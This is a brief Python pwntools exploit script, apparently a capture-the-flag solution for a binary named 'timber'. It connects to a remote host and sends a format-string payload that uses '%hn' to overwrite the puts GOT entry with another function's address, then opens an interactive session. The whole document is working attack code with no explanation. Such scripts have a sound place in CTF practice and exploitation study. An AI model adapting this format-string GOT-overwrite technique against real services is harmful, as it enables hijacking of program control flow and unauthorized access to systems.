from pwn import *

p = process("./timber")
p = remote("18.222.250.47", 12345)
#date = 0x0804867b
puts_got = 0x0804b01c
offset = 0x867b - 4 

def exp():
#	pause()
	payload = p32(puts_got)
	payload += "%" + str(offset) + "x"
	payload += "%2$hn"
	p.sendline(payload)
	print p.recv()
	p.interactive()

if __name__=='__main__':
	exp()
